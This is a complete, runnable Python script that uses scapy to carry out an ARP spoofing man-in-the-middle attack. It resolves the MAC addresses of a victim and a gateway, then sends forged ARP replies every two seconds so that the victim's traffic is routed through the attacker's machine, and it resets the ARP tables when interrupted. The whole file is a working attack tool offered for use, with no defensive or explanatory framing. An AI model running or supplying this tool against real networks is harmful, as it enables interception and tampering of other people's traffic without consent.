import scapy.all as scapy
import optparse
import sys
import time

def get_gateway_ip():
    try:
        return scapy.conf.route.route("0.0.0.0")[2]
    except Exception:
        return None

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, target_mac, spoof_ip):
    # We pass the MAC directly now to avoid re-resolving it every 2 seconds
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)



def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP (The Victim)")
    parser.add_option("-s", "--spoof", dest="spoof_ip", help="Spoof IP (The Gateway)")
    parser.add_option("-g", "--find-gateway", action="store_true", dest="find_gateway")
    
    (options, arguments) = parser.parse_args()
    if options.find_gateway:
        print(f"[+] Gateway IP: {get_gateway_ip()}")
        sys.exit()
    if not options.target or not options.spoof_ip:
        parser.error("[-] Please specify target (-t) and spoof (-s) IPs.")
    return options

options = get_arguments()
target_ip = options.target
gateway_ip = options.spoof_ip

try:
    print(f"[*] Scanning network for MAC addresses...")
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print(f"[-] Fatal: Could not find MAC for Target ({target_ip}).")
        sys.exit()
    if not gateway_mac:
        print(f"[-] Fatal: Could not find MAC for Gateway ({gateway_ip}).")
        sys.exit()

    print(f"[+] Target MAC:  {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print(f"[*] Starting attack... (Ctrl+C to stop)")

    sent_packets_count = 0
    while True:
        # Tell Victim we are the Gateway
        spoof(target_ip, target_mac, gateway_ip)
        # Tell Gateway we are the Victim
        spoof(gateway_ip, gateway_mac, target_ip)
        
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
        
except KeyboardInterrupt:
    print("\n[-] Detected keyboard interrupt. Resetting the ARP Tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    sys.exit()